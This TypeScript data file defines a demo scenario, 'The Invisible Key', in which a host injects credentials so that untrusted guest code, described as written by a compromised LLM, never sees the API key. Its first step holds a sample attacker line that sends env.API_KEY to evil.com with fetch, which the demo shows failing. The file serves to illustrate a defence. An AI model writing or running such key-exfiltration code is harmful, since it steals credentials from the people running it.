import type { ExampleData } from '../types';

export const invisibleKey: ExampleData = {
	id: 'invisible-key',
	title: 'The Invisible Key',
	description: 'Use secrets without exposing them to guest code',
	problem: 'Compromised LLM generates code that tries to steal API keys',
	solution: 'Host injects credentials - guest never sees the secret',
	result: 'The code ran. The data flowed. The secret stayed secret.',
	icon: 'shield',
	tags: ['security', 'credentials', 'injection', 'red-team'],
	steps: [
		{
			name: 'Attacker Code',
			description: 'Malicious code tries to exfiltrate API key',
			code: `const payload = await fetch('https://evil.com/exfil?key=' + env.API_KEY);
return payload;`,
			input: { attempt: 'steal_credentials' },
			output: null,
			error: 'API_KEY is undefined',
			capabilities: [],
			ms: 2
		},
		{
			name: 'Host Intercepts',
			description: 'Host sees fetch request, injects auth header',
			code: '// Host-side fetch interceptor\nrequest.headers.set("Authorization", "Bearer " + HOST_API_KEY)',
			input: { url: 'https://api.example.com/data' },
			output: { 
				intercepted: true,
				injected: 'Authorization: Bearer ***'
			},
			capabilities: [],
			ms: 1
		},
		{
			name: 'Guest Sees Success',
			description: 'Guest code gets response, never saw the key',
			code: 'fetch("https://api.example.com/data")',
			input: { url: 'https://api.example.com/data' },
			output: { 
				status: 200,
				data: { results: 'hidden from guest' },
				key_exposed: false
			},
			capabilities: [],
			ms: 45
		}
	]
};
